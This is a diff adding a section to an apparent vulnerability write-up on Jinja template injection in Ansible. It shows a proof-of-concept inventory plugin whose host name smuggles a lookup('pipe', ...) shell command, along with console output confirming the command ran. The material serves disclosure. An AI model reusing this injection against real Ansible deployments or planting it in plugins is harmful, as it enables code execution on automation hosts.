@@ -209,6 +209,45 @@ When developing an inventory, you do not expect to handle insecure input data.
 You also expect the API to handle the data in a secure way by default.
 But `set_variable` doesn't allow you to tag data as "safe" or "unsafe" easily and data in Ansible defaults to "safe".
 
+## Can something similar happen in other parts of Ansible?
+
+It certainly happened in the past that Jinja was abused in Ansible: [CVE-2016-9587](https://bugzilla.redhat.com/CVE-2016-9587), [CVE-2017-7466](https://bugzilla.redhat.com/CVE-2017-7466), [CVE-2017-7481](https://bugzilla.redhat.com/CVE-2017-7481)
+
+But even if we only look at inventories, [`add_host(host)`](https://github.com/ansible/ansible/blob/56f31126ad1c69e5eda7b92c1fa15861f722af0e/lib/ansible/inventory/data.py#L191) can be abused in a similar way:
+
+```python
+from ansible.plugins.inventory import BaseInventoryPlugin
+
+class InventoryModule(BaseInventoryPlugin):
+
+    NAME = 'evgeni.inventoryrce.inventory'
+
+    def verify_file(self, path):
+        valid = False
+        if super(InventoryModule, self).verify_file(path):
+            if path.endswith('evgeni.yml'):
+                valid = True
+        return valid
+
+    def parse(self, inventory, loader, path, cache=True):
+        super(InventoryModule, self).parse(inventory, loader, path, cache)
+        self.inventory.add_host('lol{{ lookup("pipe", "touch /tmp/hacked-host" ) }}')
+```
+
+```console
+% ANSIBLE_INVENTORY_ENABLED=evgeni.inventoryrce.inventory ansible-playbook -i inventory.evgeni.yml test.yml
+PLAY [all] ************************************************************************************************
+
+TASK [Gathering Facts] ************************************************************************************
+fatal: [lol{{ lookup("pipe", "touch /tmp/hacked-host" ) }}]: UNREACHABLE! => {"changed": false, "msg": "Failed to connect to the host via ssh: ssh: Could not resolve hostname lol: No address associated with hostname", "unreachable": true}
+
+PLAY RECAP ************************************************************************************************
+lol{{ lookup("pipe", "touch /tmp/hacked-host" ) }} : ok=0    changed=0    unreachable=1    failed=0    skipped=0    rescued=0    ignored=0
+
+% ls -alh /tmp/hacked-host
+-rw-r--r--. 1 evgeni evgeni 0 Mar 13 08:44 /tmp/hacked-host
+```
+
 ## Affected versions
 
 I've tried this on Ansible (core) 2.13.13 and 2.16.4.
